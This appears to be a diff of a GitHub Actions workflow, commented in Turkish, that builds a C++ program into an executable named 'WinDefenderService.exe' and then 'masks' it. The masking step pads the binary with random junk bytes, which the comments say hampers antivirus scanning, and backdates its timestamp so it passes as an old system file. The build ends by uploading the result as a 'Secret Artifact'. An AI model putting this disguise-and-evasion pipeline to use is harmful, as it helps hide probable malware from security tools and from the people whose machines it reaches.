@@ -10,46 +10,48 @@ jobs:
     steps:
     - uses: actions/checkout@v4
 
-    # C++ Derleyicisini (cl.exe) aktif eder
+    # 1. C++ Derleyicisini Kur
     - name: Add MSBuild to PATH
       uses: microsoft/setup-msbuild@v2
 
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
 
-    # Gerekli HTTP kütüphanesini çeker
+    # 2. Gerekli Kütüphaneyi İndir
     - name: Get Libraries
       run: |
         Invoke-WebRequest -Uri https://raw.githubusercontent.com/yhirose/cpp-httplib/master/httplib.h -OutFile httplib.h
 
-    # Kodun derlendiği ana aşama
+    # 3. C++ Kodunu Derle (main.cpp -> WinDefenderService.exe)
     - name: Compile with Optimization
       run: |
         cl.exe /EHsc /O2 /MT main.cpp /Fe:WinDefenderService.exe /link user32.lib ws2_32.lib advapi32.lib /subsystem:windows
 
-    # PowerShell 'Byte' hatasını çözen modern maskeleme adımı
+    # 4. Gelişmiş Maskeleme (Boyut Büyütme ve Tarih Değiştirme)
     - name: Advanced Masking
       shell: pwsh
       run: |
         $exe = "WinDefenderService.exe"
         if (Test-Path $exe) {
-            # Dosyayı rastgele boyutta büyütür (AV taramalarını zorlaştırır)
+            # 1MB - 2MB arası rastgele veri üret
             $randSize = Get-Random -Minimum 1048576 -Maximum 2097152
             $junk = New-Object Byte[] $randSize
             (New-Object Random).NextBytes($junk)
             
-            # .NET üzerinden doğrudan bayt ekleme (Hatasız yöntem)
-            [System.IO.File]::AppendAllBytes((Get-Item $exe).FullName, $junk)
+            # DOSYA YAZMA: En garantili yöntem (FileStream)
+            $stream = [System.IO.File]::Open($exe, [System.IO.FileMode]::Append)
+            $stream.Write($junk, 0, $junk.Length)
+            $stream.Close()
             
-            # Dosya imzasını eski bir tarihe çeker
+            # Tarihi 2021 yılına çekerek 'eski sistem dosyası' süsü ver
             (Get-Item $exe).LastWriteTime = "2021-05-12 10:00:00"
-            Write-Host "Maskeleme basariyla tamamlandi."
+            Write-Host "Maskeleme basariyla tamamlandi. Dosya boyutu artirildi."
         } else {
-            Write-Error "Hata: Exe dosyasi bulunamadi!"
+            Write-Error "Derleme hatasi: EXE dosyasi olusmadi!"
             exit 1
         }
 
-    # Sonucu indirmene izin veren adım
+    # 5. Hazır Dosyayı GitHub'a Yükle (Artifacts)
     - name: Upload Secret Artifact
       uses: actions/upload-artifact@v4
       with:
